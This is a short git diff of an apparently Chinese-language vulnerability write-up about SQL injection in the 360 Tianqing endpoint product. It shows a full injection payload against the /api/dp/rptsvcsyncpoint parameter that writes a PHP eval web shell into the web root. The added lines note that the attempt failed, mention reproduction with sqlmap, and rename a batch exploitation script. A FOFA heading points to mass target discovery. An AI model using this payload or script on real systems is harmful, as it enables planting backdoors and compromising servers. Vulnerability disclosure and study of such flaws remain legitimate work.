@@ -18,13 +18,15 @@
 ```
 /api/dp/rptsvcsyncpoint?ccid=1';create table O(T TEXT);insert into O(T) values('<?php @eval($_POST[1]);?>');copy O(T) to 'C:\Program Files (x86)\360\skylar6\www\1.php';drop table O;--
 ```
+不过并没有成功
+
 我使用sqlmap进行复现，如下图  
 ![image](./pic/0.png)
 
 # 0x05 批量脚本
 用法：
 ```
-python3 360天擎-越权访问导致数据库信息泄露-Vuln-Batch-Detect.py -h
+python3 360天擎-SQL注入-Vuln-Batch-Detect.py -h
 ```
 fofa语法：
 ```
